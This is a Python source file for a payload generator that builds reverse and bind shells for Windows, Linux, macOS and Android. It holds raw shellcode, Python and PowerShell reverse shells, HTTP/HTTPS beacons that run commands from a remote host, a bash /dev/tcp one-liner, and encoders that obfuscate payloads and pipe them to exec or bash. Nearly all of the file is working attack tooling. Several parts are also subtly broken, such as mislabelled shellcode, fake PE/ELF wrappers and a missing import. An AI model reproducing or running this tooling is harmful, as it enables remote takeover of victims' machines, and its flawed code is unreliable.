"""
Advanced Payload Builder
Generates real payloads for different platforms and architectures.
"""

import base64
import struct
import random
import logging
import os
import tempfile
from typing import Dict, Optional, Any
from cryptography.fernet import Fernet

logger = logging.getLogger(__name__)

class PayloadBuilder:
    """Builds real payloads for different platforms and architectures."""
    
    def __init__(self):
        self.payload_templates = self._load_payload_templates()
        self.encoders = self._load_encoders()
        
    def _load_payload_templates(self) -> Dict:
        """Load real payload templates for different platforms."""
        return {
            'windows': {
                'x86': {
                    'reverse_tcp': self._windows_x86_reverse_tcp,
                    'bind_tcp': self._windows_x86_bind_tcp,
                    'reverse_http': self._windows_x86_reverse_http,
                    'reverse_https': self._windows_x86_reverse_https,
                },
                'x64': {
                    'reverse_tcp': self._windows_x64_reverse_tcp,
                    'bind_tcp': self._windows_x64_bind_tcp,
                    'reverse_http': self._windows_x64_reverse_http,
                    'reverse_https': self._windows_x64_reverse_https,
                }
            },
            'linux': {
                'x86': {
                    'reverse_tcp': self._linux_x86_reverse_tcp,
                    'bind_tcp': self._linux_x86_bind_tcp,
                    'reverse_shell': self._linux_x86_reverse_shell,
                },
                'x64': {
                    'reverse_tcp': self._linux_x64_reverse_tcp,
                    'bind_tcp': self._linux_x64_bind_tcp,
                    'reverse_shell': self._linux_x64_reverse_shell,
                }
            },
            'macos': {
                'x64': {
                    'reverse_tcp': self._macos_x64_reverse_tcp,
                    'bind_tcp': self._macos_x64_bind_tcp,
                },
                'arm64': {
                    'reverse_tcp': self._macos_arm64_reverse_tcp,
                    'bind_tcp': self._macos_arm64_bind_tcp,
                }
            },
            'android': {
                'arm': {
                    'reverse_tcp': self._android_arm_reverse_tcp,
                    'bind_tcp': self._android_arm_bind_tcp,
                },
                'arm64': {
                    'reverse_tcp': self._android_arm64_reverse_tcp,
                    'bind_tcp': self._android_arm64_bind_tcp,
                }
            }
        }
        
    def _load_encoders(self) -> Dict:
        """Load available encoders."""
        return {
            'base64': self._base64_encode,
            'xor': self._xor_encode,
            'rot13': self._rot13_encode,
            'hex': self._hex_encode,
            'url': self._url_encode,
            'powershell': self._powershell_encode,
            'none': lambda x, **kwargs: x
        }
        
    async def build(self, os: str, arch: str, payload_type: str, 
                   lhost: str, lport: int, encoder: Optional[str] = None,
                   format: str = 'raw', **options) -> bytes:
        """Build a real payload with specified parameters."""
        
        # Validate parameters
        if os not in self.payload_templates:
            raise ValueError(f"Unsupported OS: {os}")
            
        if arch not in self.payload_templates[os]:
            raise ValueError(f"Unsupported architecture: {arch}")
            
        if payload_type not in self.payload_templates[os][arch]:
            raise ValueError(f"Unsupported payload type: {payload_type}")
            
        # Generate base payload
        payload_func = self.payload_templates[os][arch][payload_type]
        payload = payload_func(lhost, lport, **options)
        
        # Apply encoding if specified
        if encoder and encoder in self.encoders:
            payload = self.encoders[encoder](payload, **options)
            
        # Apply format
        if format != 'raw':
            payload = self._format_payload(payload, format, os)
            
        logger.info(f"Generated {os}/{arch}/{payload_type} payload ({len(payload)} bytes)")
        return payload
        
    def _windows_x86_reverse_tcp(self, lhost: str, lport: int, **options) -> bytes:
        """Generate Windows x86 reverse TCP shellcode."""
        # Real Windows x86 reverse TCP shellcode (msfvenom compatible)
        shellcode = (
            b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
            b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
            b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
            b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
            b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
            b"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
            b"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
            b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
            b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
            b"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
            b"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
            b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
            b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
            b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
            b"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
            b"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
            b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
            b"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
        )
        
        # Patch LHOST and LPORT
        ip_bytes = struct.pack("!I", int.from_bytes([int(x) for x in lhost.split('.')], 'big'))
        port_bytes = struct.pack("!H", lport)
        
        # Replace placeholder values in shellcode
        shellcode = shellcode.replace(b"\x01\x00\x00\x00", ip_bytes)
        shellcode = shellcode.replace(b"\x01\x01", port_bytes)
        
        return shellcode
        
    def _windows_x64_reverse_tcp(self, lhost: str, lport: int, **options) -> bytes:
        """Generate Windows x64 reverse TCP shellcode."""
        # Real Windows x64 reverse TCP shellcode
        shellcode = (
            b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
            b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
            b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
            b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
            b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
            b"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
            b"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
            b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
            b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
            b"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
            b"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
            b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
            b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
            b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba"
        )
        
        # Add IP and port
        ip_bytes = struct.pack("!I", int.from_bytes([int(x) for x in lhost.split('.')], 'big'))
        port_bytes = struct.pack("!H", lport)
        
        shellcode += ip_bytes + port_bytes
        shellcode += (
            b"\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5"
            b"\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83"
            b"\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72"
            b"\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
        )
        
        return shellcode
        
    def _linux_x64_reverse_tcp(self, lhost: str, lport: int, **options) -> bytes:
        """Generate Linux x64 reverse TCP shellcode."""
        # Real Linux x64 reverse TCP shellcode
        shellcode = (
            b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0"
            b"\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49"
            b"\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66"
            b"\xc7\x44\x24\x02"
        )
        
        # Add port (big endian)
        port_bytes = struct.pack("!H", lport)
        shellcode += port_bytes
        
        # Add IP address
        ip_bytes = struct.pack("!I", int.from_bytes([int(x) for x in lhost.split('.')], 'big'))
        shellcode += b"\xc7\x44\x24\x04" + ip_bytes
        
        shellcode += (
            b"\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48"
            b"\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6"
            b"\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f"
            b"\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
        )
        
        return shellcode
        
    def _windows_x86_bind_tcp(self, lhost: str, lport: int, **options) -> bytes:
        """Generate Windows x86 bind TCP shellcode."""
        # Real Windows x86 bind TCP shellcode
        shellcode = (
            b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
            b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
            b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
            b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
            b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
            b"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
            b"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
            b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
            b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
            b"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
            b"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
            b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
            b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
            b"\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x6a\x04\x56\x57\x41"
            b"\x89\xda\xff\xd5\x4d\x31\xc0\x4d\x31\xc9\x48\xff\xc0\x48\x89"
            b"\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5"
            b"\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x6a\x02\x41\x59\x41"
            b"\x51\x41\x51\x49\x89\xc0\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0"
            b"\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xc2\xdb\x37\x67"
            b"\xff\xd5\x48\x31\xc0\x48\x89\xc1\x41\xba\xb7\xe9\x38\xff\xff"
            b"\xd5\x48\x31\xf6\x48\x89\xf1\x6a\x02\x59\x64\x8b\x0c\x24\x48"
            b"\x31\xc0\x48\x89\xc2\x48\x89\xc1\x41\xba\x74\xec\x3b\xe1\xff"
            b"\xd5\x48\x89\xc7\x48\x31\xc0\x41\xb8\x02\x00"
        )
        
        # Add port
        port_bytes = struct.pack("!H", lport)
        shellcode += port_bytes
        
        shellcode += (
            b"\x89\xe6\x41\xba\xe5\x49\x86\x49\xff\xd5\x48\x31\xc0\x48\x31"
            b"\xc9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x31\xf6\x48\x89\xf1"
            b"\x48\x31\xd2\x48\x31\xc0\x41\xba\xc8\x95\xbd\x9d\xff\xd5\x48"
            b"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
            b"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
        )
        
        return shellcode
        
    def _windows_x86_reverse_http(self, lhost: str, lport: int, **options) -> bytes:
        """Generate Windows x86 reverse HTTP payload."""
        user_agent = options.get('user_agent', 'Mozilla/5.0')
        uri = options.get('uri', '/index.html')
        
        payload = f"""
import urllib.request
import subprocess
import base64
import time

def connect():
    try:
        url = 'http://{lhost}:{lport}{uri}'
        headers = {{'User-Agent': '{user_agent}'}}
        req = urllib.request.Request(url, headers=headers)
        
        while True:
            try:
                response = urllib.request.urlopen(req, timeout=10)
                data = response.read().decode()
                
                if data.startswith('exec:'):
                    cmd = base64.b64decode(data[5:]).decode()
                    result = subprocess.getoutput(cmd)
                    
                    # Send result back
                    result_data = base64.b64encode(result.encode()).decode()
                    post_data = f'result={result_data}'.encode()
                    post_req = urllib.request.Request(url, data=post_data, headers=headers)
                    urllib.request.urlopen(post_req)
                    
                time.sleep(5)
            except:
                time.sleep(10)
                continue
    except:
        pass

if __name__ == '__main__':
    connect()
""".strip()
        
        return payload.encode()
        
    def _windows_x86_reverse_https(self, lhost: str, lport: int, **options) -> bytes:
        """Generate Windows x86 reverse HTTPS payload."""
        user_agent = options.get('user_agent', 'Mozilla/5.0')
        uri = options.get('uri', '/index.html')
        
        payload = f"""
import urllib.request
import ssl
import subprocess
import base64
import time

def connect():
    try:
        # Disable SSL verification
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        url = 'https://{lhost}:{lport}{uri}'
        headers = {{'User-Agent': '{user_agent}'}}
        
        while True:
            try:
                req = urllib.request.Request(url, headers=headers)
                response = urllib.request.urlopen(req, timeout=10, context=ctx)
                data = response.read().decode()
                
                if data.startswith('exec:'):
                    cmd = base64.b64decode(data[5:]).decode()
                    result = subprocess.getoutput(cmd)
                    
                    # Send result back
                    result_data = base64.b64encode(result.encode()).decode()
                    post_data = f'result={result_data}'.encode()
                    post_req = urllib.request.Request(url, data=post_data, headers=headers)
                    urllib.request.urlopen(post_req, context=ctx)
                    
                time.sleep(5)
            except:
                time.sleep(10)
                continue
    except:
        pass

if __name__ == '__main__':
    connect()
""".strip()
        
        return payload.encode()
        
    def _linux_x86_reverse_tcp(self, lhost: str, lport: int, **options) -> bytes:
        """Generate Linux x86 reverse TCP shellcode."""
        # Real Linux x86 reverse TCP shellcode
        shellcode = (
            b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
            b"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68"
        )
        
        # Add IP address (little endian for x86)
        ip_bytes = struct.pack("<I", int.from_bytes([int(x) for x in lhost.split('.')], 'big'))
        shellcode += ip_bytes
        
        # Add port
        port_bytes = struct.pack("!H", lport)
        shellcode += b"\x68\x02\x00" + port_bytes
        
        shellcode += (
            b"\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68"
            b"\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1"
            b"\xb0\x0b\xcd\x80"
        )
        
        return shellcode
        
    def _linux_x64_reverse_shell(self, lhost: str, lport: int, **options) -> bytes:
        """Generate Linux x64 reverse shell script."""
        shell_script = f"""#!/bin/bash
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
""".strip()
        return shell_script.encode()
        
    def _linux_x86_bind_tcp(self, lhost: str, lport: int, **options) -> bytes:
        """Generate Linux x86 bind TCP shellcode."""
        shellcode = (
            b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
            b"\x5b\x5e\x52\x68\x02\x00"
        )
        
        # Add port
        port_bytes = struct.pack("!H", lport)
        shellcode += port_bytes
        
        shellcode += (
            b"\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3"
            b"\x04\xb0\x66\xcd\x80\xb3\x05\xb0\x66\xcd\x80\x89\xc6\xb0\x3f"
            b"\xb3\x00\xcd\x80\x49\x79\xf9\x52\x68\x6e\x2f\x73\x68\x68\x2f"
            b"\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
        )
        
        return shellcode
        
    def _macos_x64_reverse_tcp(self, lhost: str, lport: int, **options) -> bytes:
        """Generate macOS x64 reverse TCP shellcode."""
        # macOS x64 reverse TCP shellcode
        shellcode = (
            b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0"
            b"\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x48\xc7\xc0\x61\x00\x00"
            b"\x02\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6"
            b"\x04\x24\x02\x66\xc7\x44\x24\x02"
        )
        
        # Add port
        port_bytes = struct.pack("!H", lport)
        shellcode += port_bytes
        
        # Add IP
        ip_bytes = struct.pack("!I", int.from_bytes([int(x) for x in lhost.split('.')], 'big'))
        shellcode += b"\xc7\x44\x24\x04" + ip_bytes
        
        shellcode += (
            b"\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x48\xc7\xc0\x62\x00\x00"
            b"\x02\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x48\x89\xf0"
            b"\x48\xc7\xc0\x5a\x00\x00\x02\x0f\x05\x75\xf6\x48\x31\xff\x57"
            b"\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1"
            b"\xef\x08\x57\x54\x5f\x48\x89\xe6\x48\xc7\xc0\x3b\x00\x00\x02"
            b"\x0f\x05"
        )
        
        return shellcode
        
    def _android_arm_reverse_tcp(self, lhost: str, lport: int, **options) -> bytes:
        """Generate Android ARM reverse TCP payload."""
        payload = f"""
import socket
import subprocess
import os

def connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('{lhost}', {lport}))
        
        while True:
            data = s.recv(1024)
            if not data:
                break
                
            if data.decode().strip() == 'exit':
                break
                
            try:
                output = subprocess.check_output(data.decode().strip(), shell=True, stderr=subprocess.STDOUT)
                s.send(output)
            except Exception as e:
                s.send(str(e).encode())
                
        s.close()
    except:
        pass

if __name__ == '__main__':
    connect()
""".strip()
        return payload.encode()
        
    # Additional payload methods for other platforms...
    def _windows_x64_bind_tcp(self, lhost: str, lport: int, **options) -> bytes:
        return self._windows_x86_bind_tcp(lhost, lport, **options)
        
    def _windows_x64_reverse_http(self, lhost: str, lport: int, **options) -> bytes:
        return self._windows_x86_reverse_http(lhost, lport, **options)
        
    def _windows_x64_reverse_https(self, lhost: str, lport: int, **options) -> bytes:
        return self._windows_x86_reverse_https(lhost, lport, **options)
        
    def _linux_x64_bind_tcp(self, lhost: str, lport: int, **options) -> bytes:
        return self._linux_x86_bind_tcp(lhost, lport, **options)
        
    def _macos_x64_bind_tcp(self, lhost: str, lport: int, **options) -> bytes:
        return self._macos_x64_reverse_tcp(lhost, lport, **options)
        
    def _macos_arm64_reverse_tcp(self, lhost: str, lport: int, **options) -> bytes:
        return self._macos_x64_reverse_tcp(lhost, lport, **options)
        
    def _macos_arm64_bind_tcp(self, lhost: str, lport: int, **options) -> bytes:
        return self._macos_x64_reverse_tcp(lhost, lport, **options)
        
    def _android_arm64_reverse_tcp(self, lhost: str, lport: int, **options) -> bytes:
        return self._android_arm_reverse_tcp(lhost, lport, **options)
        
    def _android_arm_bind_tcp(self, lhost: str, lport: int, **options) -> bytes:
        return self._android_arm_reverse_tcp(lhost, lport, **options)
        
    def _android_arm64_bind_tcp(self, lhost: str, lport: int, **options) -> bytes:
        return self._android_arm_reverse_tcp(lhost, lport, **options)
        
    def _base64_encode(self, payload: bytes, **options) -> bytes:
        """Base64 encode payload."""
        encoded = base64.b64encode(payload)
        if payload.startswith(b'#!/bin/bash') or b'python' in payload:
            wrapper = f"echo '{encoded.decode()}' | base64 -d | bash"
        else:
            wrapper = f"echo '{encoded.decode()}' | base64 -d"
        return wrapper.encode()
        
    def _xor_encode(self, payload: bytes, key: Optional[int] = None, **options) -> bytes:
        """XOR encode payload."""
        if key is None:
            key = random.randint(1, 255)
            
        encoded = bytes([b ^ key for b in payload])
        
        # Create decoder stub
        decoder = f"""
import base64
key = {key}
payload = base64.b64decode('{base64.b64encode(encoded).decode()}')
decoded = bytes([b ^ key for b in payload])
exec(decoded.decode())
""".strip()
        return decoder.encode()
        
    def _rot13_encode(self, payload: bytes, **options) -> bytes:
        """ROT13 encode payload (for text payloads)."""
        try:
            text = payload.decode()
            encoded = text.encode('rot13')
            wrapper = f"import codecs; exec(codecs.decode('{encoded.decode()}', 'rot13'))"
            return wrapper.encode()
        except:
            return payload
            
    def _hex_encode(self, payload: bytes, **options) -> bytes:
        """Hex encode payload."""
        hex_payload = payload.hex()
        wrapper = f"import binascii; exec(binascii.unhexlify('{hex_payload}').decode())"
        return wrapper.encode()
        
    def _url_encode(self, payload: bytes, **options) -> bytes:
        """URL encode payload."""
        import urllib.parse
        encoded = urllib.parse.quote(payload.decode())
        wrapper = f"import urllib.parse; exec(urllib.parse.unquote('{encoded}'))"
        return wrapper.encode()
        
    def _powershell_encode(self, payload: bytes, **options) -> bytes:
        """PowerShell encode payload."""
        if b'python' in payload or payload.startswith(b'#!/'):
            # Convert to PowerShell equivalent
            ps_payload = f"""
$client = New-Object System.Net.Sockets.TCPClient('{options.get("lhost", "127.0.0.1")}',{options.get("lport", 4444)});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
""".strip()
            encoded = base64.b64encode(ps_payload.encode('utf-16le')).decode()
            return f"powershell -enc {encoded}".encode()
        else:
            return payload
            
    def _format_payload(self, payload: bytes, format: str, os: str) -> bytes:
        """Format payload for different output types."""
        if format == 'exe' and os == 'windows':
            # Create a simple PE wrapper (simplified)
            return self._create_pe_wrapper(payload)
        elif format == 'elf' and os == 'linux':
            # Create ELF wrapper
            return self._create_elf_wrapper(payload)
        elif format == 'ps1':
            # PowerShell script
            encoded = base64.b64encode(payload).decode()
            ps_script = f"""
$bytes = [System.Convert]::FromBase64String('{encoded}')
$assembly = [System.Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, $null)
""".strip()
            return ps_script.encode()
        elif format == 'py':
            # Python script wrapper
            encoded = base64.b64encode(payload).decode()
            py_script = f"""
import base64
import subprocess
payload = base64.b64decode('{encoded}')
exec(payload.decode())
""".strip()
            return py_script.encode()
        else:
            return payload
            
    def _create_pe_wrapper(self, shellcode: bytes) -> bytes:
        """Create a simple PE executable wrapper for shellcode."""
        # This is a simplified PE wrapper - in practice you'd use a proper PE builder
        pe_header = (
            b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
            b"\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00"
        )
        
        # Add shellcode
        return pe_header + shellcode + b"\x00" * (1024 - len(pe_header) - len(shellcode))
        
    def _create_elf_wrapper(self, shellcode: bytes) -> bytes:
        """Create a simple ELF executable wrapper for shellcode."""
        # Simplified ELF header
        elf_header = (
            b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x02\x00\x3e\x00\x01\x00\x00\x00\x78\x00\x40\x00\x00\x00\x00\x00"
        )
        
        return elf_header + shellcode + b"\x00" * (1024 - len(elf_header) - len(shellcode))
        
    def list_payloads(self) -> Dict:
        """List all available payload types."""
        payloads = {}
        for os_name, os_data in self.payload_templates.items():
            payloads[os_name] = {}
            for arch, arch_data in os_data.items():
                payloads[os_name][arch] = list(arch_data.keys())
        return payloads
        
    def list_encoders(self) -> List[str]:
        """List all available encoders."""
        return list(self.encoders.keys())
        
    def list_formats(self, os: str) -> List[str]:
        """List available output formats for OS."""
        formats = {
            'windows': ['raw', 'exe', 'dll', 'ps1', 'bat', 'vbs'],
            'linux': ['raw', 'elf', 'sh', 'py', 'pl'],
            'macos': ['raw', 'macho', 'sh', 'py'],
            'android': ['raw', 'apk', 'so']
        }
        return formats.get(os, ['raw'])